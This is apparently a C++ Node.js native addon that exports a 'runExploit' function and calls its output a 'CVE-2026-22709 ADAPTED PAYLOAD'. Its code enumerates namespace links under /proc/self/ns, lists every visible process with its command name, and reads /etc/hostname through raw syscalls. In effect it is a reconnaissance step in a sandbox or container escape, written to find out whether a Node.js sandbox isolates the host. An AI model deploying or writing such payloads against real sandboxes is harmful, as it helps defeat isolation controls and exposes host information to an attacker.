#include <node_api.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <dirent.h>
#include <string>
#include <vector>
#include <fstream>

std::string direct_read(const char* path) {
    char buf[1024];
    int fd = syscall(SYS_open, path, O_RDONLY);
    if (fd < 0) return "SYS_OPEN_FAILED";

    int n = syscall(SYS_read, fd, buf, 1023);
    syscall(SYS_close, fd);

    if (n <= 0) return "SYS_READ_EMPTY";
    buf[n] = '\0';
    return std::string(buf);
}

std::string check_namespaces() {
    std::string report = "--- NAMESPACE INTEGRITY CHECK ---\n";
    const char* ns_paths[] = {"/proc/self/ns/net", "/proc/self/ns/uts", "/proc/self/ns/mnt"};

    for (const char* path : ns_paths) {
        char link[256];
        ssize_t len = readlink(path, link, sizeof(link)-1);
        if (len != -1) {
            link[len] = '\0';
            report += std::string(path) + " -> " + std::string(link) + "\n";
        }
    }
    return report;
}

std::string scan_pids() {
    std::string report = "--- PROCESS VISIBILITY SCAN ---\n";
    DIR* dir = opendir("/proc");
    struct dirent* ent;
    while ((ent = readdir(dir)) != NULL) {
        if (isdigit(ent->d_name[0])) {
            std::string cmd_path = std::string("/proc/") + ent->d_name + "/comm";
            std::ifstream comm(cmd_path);
            std::string cmd_name;
            if (comm >> cmd_name) {
                report += "PID " + std::string(ent->d_name) + ": " + cmd_name + "\n";
            }
        }
    }
    closedir(dir);
    return report;
}

napi_value RunExploit(napi_env env, napi_callback_info info) {
    std::string final_report = "--- CVE-2026-22709 ADAPTED PAYLOAD ---\n";
    final_report += check_namespaces();
    final_report += scan_pids();
    final_report += "\n[DIRECT SYSCALL TEST]\n";
    final_report += "/etc/hostname: " + direct_read("/etc/hostname");

    napi_value res;
    napi_create_string_utf8(env, final_report.c_str(), final_report.length(), &res);
    return res;
}

napi_value Init(napi_env env, napi_value exports) {
    napi_property_descriptor desc = { "runExploit", 0, RunExploit, 0, 0, 0, napi_default, 0 };
    napi_define_properties(env, exports, 1, &desc);
    return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, Init)
